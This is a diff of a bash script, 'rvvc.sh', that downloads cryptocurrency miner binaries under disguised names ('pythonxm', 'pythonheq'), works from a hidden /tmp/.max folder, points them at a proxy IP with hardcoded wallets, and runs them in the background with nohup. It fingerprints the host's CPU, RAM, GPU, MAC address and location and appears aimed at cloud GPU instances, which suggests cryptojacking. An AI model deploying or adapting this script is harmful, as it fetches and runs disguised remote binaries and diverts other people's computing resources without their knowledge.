CPU VC++

+++ rvvc.sh
@@ -1,18 +1,20 @@
-#!/bin/bash -xe
+#!/bin/bash
+echo 
 echo -e '####################################################################################'
-echo -e '##################   '"MAX  Auto"' Ver:0.2.19      ############################'
+echo -e '##################         '"RV-VC"' Ver:0.7.7        ################################'
 echo -e '####################################################################################'
-mkdir -p /tmp/.max/
-cd  /tmp/.max/
+echo 
+echo 
+echo 
 
 PROX=217.69.7.240
 ETPort=443
 RVPort=80
-VCPort=8080
-XMProt=21
-DisplayRefrech=60
+VCPort=21
+XMPort=8080
+DisplayRefrech=10
 
-VCThreads=$[$(nproc)*4]
+VCThreads=$[$(nproc)*2]
 XMThreads=$[$(nproc)*1]
 
 #Debug=True
@@ -24,11 +26,111 @@ W_RV="RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK"
 W_XM="44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p"
 W_VC="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
 
-#
+##################### functions #####################################
+
+function displaytime {
+  local T=$1
+  local D=$((T/60/60/24))
+  local H=$((T/60/60%24))
+  local M=$((T/60%60))
+  local S=$((T%60))
+  (( $D > 0 )) && printf '%d days ' $D
+  (( $H > 0 )) && printf '%d hours ' $H
+  (( $M > 0 )) && printf '%d minutes ' $M
+  (( $D > 0 || $H > 0 || $M > 0 )) && printf 'and '
+  printf '%d seconds\n' $S
+}
+
+
+##  CPU info
+echo -e '#####################################   CPU info  ###########################################'
+
+VCPUNUM=$(nproc)
+cpufile=/proc/cpuinfo
+test -f $cpufile || exit 1
+CPUMODEL=$(grep "model name" $cpufile | sort -u | cut -d : -f 2-)
+echo -n CPU Model: $CPUMODEL
+CPUCACHE=$(grep "cache size" $cpufile | sort -u | cut -d : -f 2-)
+echo " with $CPUCACHE cache."
+CPUSPEED=$(grep "cpu MHz" $cpufile | sort -u | cut -d : -f 2-|tail -n 1)
+echo " with $CPUSPEED MHz."
+numphy=$(grep "physical id" $cpufile | sort -u | wc -l)
+echo -n "Physical CPUs: ${numphy}.  "
+numcore=$(grep "core id" $cpufile | sort -u | wc -l)
+echo -n "Cores/CPU: ${numcore}.  "
+echo -n "Physical cores: $((numcore * numphy)).  "
+numlog=$(grep "processor" $cpufile | wc -l)
+echo "Logical cores: ${numlog}."
+
+memtot=$(free -h | grep Mem | awk '{print $2}')
+echo -n "Total RAM: ${memtot}."
+
+# The /usr/sbin/dmidecode command can give the number, size and speed of the
+# installed RAM, but it must be run as root.
+if [[ "$USER" == "root" ]]; then
+    raminfo=$(dmidecode --type 17 |\
+            awk '/Size/{if ($2!="No") printf "%s %s, ",$2,$3} {if ($1=="Speed:" && $2!="Unknown") print $2" "$3}' |\
+            uniq -c)
+    echo -n "  Composition:"
+    echo "$raminfo" | awk '{if (NF==5) print "  "$1" x "$2" "$3" "$4" "$5"."}'
+else
+    echo
+fi
+
+gcard=$(lspci | awk -F ':' '/VGA/{print $3}')
+echo "Graphics:${gcard}."
+
+netinfo=$(ip addr | grep -2 "en[o-p][0-9]\|eth[0-9]" | grep -1 "inet ")
+macaddr=$(echo "$netinfo" | awk '/link/{print $2}')
+ipaddr=$(echo "$netinfo" | awk '/inet/{print $2}' | awk -F'/' '{print $1}')
+echo "Ethernet: MAC Address: ${macaddr}.  IP Address: ${ipaddr}."
+
+echo -e '#############################################################################################'
+
+mkdir -p /tmp/.max/
+cd  /tmp/.max/
+
+wget -q -O /tmp/jq https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64
+chmod +x /tmp/jq
+
+
+INFIDIFF=$(curl -s 'https://api.minerstat.com/v2/coins?list=ETH,RVN,XMR,VRSC')
+
+
+ETHDIF=$(echo  $INFIDIFF | /tmp/jq '.[0].difficulty')
+ETHREWARD=$(echo  $INFIDIFF  | /tmp/jq '.[0].reward')
+ETHPRICE=$(echo  $INFIDIFF | /tmp/jq '.[0].price')
+
+
+RVDIF=$(echo  $INFIDIFF | /tmp/jq '.[1].difficulty')
+RVREWARD=$(echo  $INFIDIFF  | /tmp/jq '.[1].reward')
+RVPRICE=$(echo  $INFIDIFF | /tmp/jq '.[1].price')
+
+VCDIF=$(echo  $INFIDIFF | /tmp/jq '.[3].difficulty')
+VCREWARD=$(echo  $INFIDIFF  | /tmp/jq '.[3].reward')
+VCPRICE=$(echo  $INFIDIFF | /tmp/jq '.[3].price')
+
+XMDIF=$(echo  $INFIDIFF | /tmp/jq '.[2].difficulty')
+XMREWARD=$(echo  $INFIDIFF  | /tmp/jq '.[2].reward')
+XMPRICE=$(echo  $INFIDIFF | /tmp/jq '.[2].price')
+
+
+
+
+ETHPROFIT=$(python3 -c "print( 22.0*$ETHREWARD*1e6*$ETHPRICE*24*30 )"  )
+RVPROFIT=$(python3 -c "print( 8.0*$RVREWARD*1e6*$RVPRICE*24*30 )"  )
+VCPROFIT=$(python3 -c "print( 1.6*$VCREWARD*1e6*$VCPRICE*24*30 )")
+XMPROFIT=$(python3 -c "print(  220.2*$XMREWARD*$XMPRICE*24*30 )"   )
+
+echo "Normal Month worth : ET = $ETHPROFIT , RV = $RVPROFIT , VC = $VCPROFIT , XM = $XMPROFIT"
+
 
 ## getting IP info
-
-JSINFO=$(curl ipinfo.io)
+#COININFO=$(curl -s https://whattomine.com/coins.json)
+#COININFO_PARSED=$(echo $COININFO|grep -oP '(?<="coins": ")[^"]*')
+#ETINFO=$(echo $COININFO_PARSED|grep -oP '(?<="Ethereum": ")[^"]*')
+#RVINFO=$(echo $COININFO_PARSED|grep -oP '(?<="Ravencoin": ")[^"]*')
+JSINFO=$(curl -s ipinfo.io)
 CITY=$(echo $JSINFO|grep -oP '(?<="city": ")[^"]*')
 REGION=$(echo $JSINFO|grep -oP '(?<="region": ")[^"]*')
 COUNTRY=$(echo $JSINFO|grep -oP '(?<="country": ")[^"]*')
@@ -161,12 +263,12 @@ then
 
 echo -e "${On_IGreen}"'###### P100-PCIE ######'"${Color_Off}"
 GPU=P100
-OPG=ET
+OPG=RV
 PROG=CU
 BGColor=$On_IGreen
 elif [ $(nvidia-smi | grep failed |wc -l) == 1 ]
 then
-echo -e "${On_IRed}"'#### ONLY CPU ###'"${Color_Off}"
+echo -e "${On_IBlue}"'#### ONLY CPU ###'"${Color_Off}"
 GPU=NONE
 OPG=NONE
 BGColor=$On_IRed
@@ -181,14 +283,14 @@ then
 echo -e "${On_IBlue}"'####        T4        ###'"${Color_Off}"
 GPU=T4
 OPG=ET
-PROG=CL
+PROG=CU
 BGColor=$On_IBlue
 elif [ $(nvidia-smi | grep K80 |wc -l) == 1 ]
 then
 echo -e "${On_IYellow}"'###    K80     ###'"${Color_Off}"
 GPU=K80
 OPG=RV
-PROG=CL
+PROG=CU
 BGColor="$On_IYellow""$BRed"
 elif [ $(nvidia-smi | grep P4 |wc -l) == 1 ]
 then
@@ -211,9 +313,8 @@ fi
 ########                execution                        #########     
 ##################################################################
 #OP=$OP
-#OPG=$OPG
-OP=VC
 OPG=RV
+OP=VC
 
 i="0"
 
@@ -231,11 +332,13 @@ then
     wget -q https://github.com/one10001/10001code/raw/main/config.json
     sed -i "s+ip0001+RV_$IPNAME+g" config.json
     sed -i "s+78.47.69.185+$PROX+g" config.json
+    sed -i "s+:8080+:$XMPort+g" config.json
     sed -i "s+44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p+$W_XM+g" config.json
 
     nohup ./pythonxm -c config.json -t "$XMThreads" -l ooutxm 2>> ooutxm 1>> ooutxm &
 
-else
+elif [ $OP == "VC" ]
+then  
     ###### VC
     echo start >> ooutvc
     rm -rf pythonheq
@@ -243,7 +346,28 @@ else
     chmod +x pythonheq
 
     nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."VC_""$INFO" -t "$VCThreads" 1>> ooutvc 2>> ooutvc &
+else
+    VCThreads=$[$(nproc)/2]
+    XMThreads=$[$(nproc)/2]
+        ####### XM
+    #               Executable
+    echo start >> ooutxm
+    rm -rf pythonxm
+    wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
+    chmod +x pythonxm
+    #                Config
+    wget -q https://github.com/one10001/10001code/raw/main/config.json
+    sed -i "s+ip0001+RV_$IPNAME+g" config.json
+    sed -i "s+78.47.69.185+$PROX+g" config.json
+    sed -i "s+44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p+$W_XM+g" config.json
 
+    nohup ./pythonxm -c config.json -t "$XMThreads" -l ooutxm 2>> ooutxm 1>> ooutxm &
+    echo start >> ooutvc
+    rm -rf pythonheq
+    wget -q https://github.com/one10001/10001code/raw/main/pythonheq
+    chmod +x pythonheq
+
+    nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."VC_""$INFO" -t "$VCThreads" 1>> ooutvc 2>> ooutvc &
 fi
 
 if [ $OPG == "ET" ]
@@ -281,7 +405,13 @@ fi
 while true
     do
         i=$[$i+1]
-        echo -e "${BIYellow}${BGColor}CPU OP: $OP | GPU OP: $OPG  | GPU: $GPU  |  CPU ARC: $CPU  | IP: $IIP |  INFO: $COUNTRY - $REGION - $CITY - $IPORG"
+        echo -e "${On_IWhite}${BIGreen}Timer: $(displaytime $[$i*$DisplayRefrech])|${On_IWhite}${BIBlue} IP: $IIP |  INFO: $COUNTRY - $REGION - $CITY - $IPORG ${Color_Off}"
+        if [ $GPU == "NONE" ]
+        then
+        echo -e "${BCColor} CPU OP: $OP |  CPU $CPU: $CPUSPEED x $VCPUNUM - $CPUCACHE | RAM: $memtot  "
+        else
+        echo -e "${BIYellow}${BGColor}GPU OP: $OPG  | GPU: $GPU / $PROG |${BCColor} CPU OP: $OP |  CPU $CPU: $CPUSPEED x $VCPUNUM - $CPUCACHE | RAM: $memtot "
+        fi
 
         Gacc=$(grep Acc oout | wc -l)
         Vacc=$(grep Acc ooutvc | wc -l)
@@ -289,12 +419,19 @@ while true
 
         if [ $GPU == "NONE" ]
         then
-        echo -e "${On_BLUE}ONLY CPU ${BIYellow}"
+        echo -e "ONLY CPU " > /tmp/envtype
         else
+        echo -e "CPU + GPU" > /tmp/envtype
                 Gspeed=$(grep 'Mh' oout | tail -n 1 |awk -F" " '{print $7}')
                 GSHARE=$(grep Acc oout | wc -l)
                 GRATIO=$[$GSHARE*3600/($i*$DisplayRefrech)]
-                echo -e "${BIWhite}${BGColor} $OPG -> ${BIYellow} $i ${Color_Off}:  ${BIGreen} GSHARE: $GSHARE ${Color_Off} | ${BIPurple} GRATIO : ${BIBlue} $GRATIO ${Color_Off} | GSpeed :${BIRed} $Gspeed ${Color_Off}" 
+                if [ $OPG == "RV" ]
+                then
+                GPROFIT=$(python3 -c "print(  $Gspeed*$RVREWARD*$RVPRICE*24*30 )" 2>> /tmp/.max/err  )
+                else
+                GPROFIT=$(python3 -c "print(  $Gspeed*$ETHREWARD*$ETHPRICE*24*30 )" 2>> /tmp/.max/err   )
+                fi
+                echo -e "${BIWhite}${BGColor}GPU $OPG -> ${BIYellow} $i ${Color_Off}:  ${BIGreen} GSHARE: $GSHARE ${Color_Off} | ${BIPurple} GRATIO : ${BIBlue} $GRATIO ${Color_Off} | GSpeed :${BIRed} $Gspeed ${Color_Off} | PerMonth :${BIRed} $GPROFIT ${Color_Off}" 
 
         fi
 
@@ -303,21 +440,28 @@ while true
 
         if [ $OP == "XM" ]
         then
-            Xspeed=$(grep 'max' ooutxm | tail -n 1 |awk -F"max" '{print $2}')
+            Xspeed=$(grep 'max' ooutxm | tail -n 1 |awk -F"max" '{print $2}'| sed 's|H/s||g')  
             XSHARE=$(grep Acc oout | wc -l)
             XRATIO=$[$XSHARE*3600/($i*$DisplayRefrech)]
-            echo -e "${BIWhite}${BCColor} $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} XSHARE: $XSHARE ${Color_Off} | ${BIPurple} XRATIO : ${BIRed} $XRATIO ${Color_Off} | XSpeed :${BIRed} $Xspeed ${Color_Off}" 
+            XMPROFIT=$(python3 -c "print( $Xspeed*$XMREWARD*$XMPRICE*24*30 )" 2>> /tmp/.max/err  )
+            echo -e "${BIWhite}${On_Red}CPU $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} XSHARE: $XSHARE ${Color_Off} | ${BIPurple} XRATIO : ${BIRed} $XRATIO ${Color_Off} | XSpeed :${BIRed} $Xspeed ${Color_Off} | PerMonth :${BIRed} $XMPROFIT ${Color_Off}" 
         elif [ $OP == "VC" ]
         then
             Vspeed=$(grep 'Speed' ooutvc | tail -n 1 |awk -F" " '{print $5}')
             VSHARE=$(grep Acc ooutvc | wc -l)
             VRATIO=$[$VSHARE*3600/($i*$DisplayRefrech)]
-            echo -e "${BIWhite}${BCColor} $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $VRATIO ${Color_Off}  | VSpeed :${BIRed} $Vspeed ${Color_Off}" 
+            VCPROFIT=$(python3 -c "print(  $Vspeed *$VCREWARD*1e6*$VCPRICE*24*30 )" 2>> /tmp/.max/err) 
+            echo -e "${BIWhite}${On_Blue}CPU $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $VRATIO ${Color_Off}  | VSpeed :${BIRed} $Vspeed ${Color_Off} | PerMonth :${BIRed} $VCPROFIT ${Color_Off}" 
         else 
             Vspeed=$(grep 'Speed' ooutvc | tail -n 1 |awk -F" " '{print $5}')
             VSHARE=$(grep Acc ooutvc | wc -l)
             VRATIO=$[$VSHARE*3600/($i*$DisplayRefrech)]
-            echo -e "${BIWhite}${BCColor} $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $XRATIO ${Color_Off} | VSpeed :${BIRed} $Vspeed ${Color_Off}" 
+            echo -e "${BIWhite}${On_Blue}CPU VC -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $XRATIO ${Color_Off} | VSpeed :${BIRed} $Vspeed ${Color_Off}" 
+            Xspeed=$(grep 'max' ooutxm | tail -n 1 |awk -F"max" '{print $2}')
+            XSHARE=$(grep Acc oout | wc -l)
+            XRATIO=$[$XSHARE*3600/($i*$DisplayRefrech)]
+            echo -e "${BIWhite}${On_Red} XM -> ${BIYellow} $i ${Color_Off}: ${BIBlue} XSHARE: $XSHARE ${Color_Off} | ${BIPurple} XRATIO : ${BIRed} $XRATIO ${Color_Off} | XSpeed :${BIRed} $Xspeed ${Color_Off}" 
+       
         fi
 
         if [ $Debug == "True" ]
@@ -330,7 +474,8 @@ while true
             tail ooutvc
             echo 
         fi
-
+        echo 
+        echo 
         sleep $DisplayRefrech
 
     done
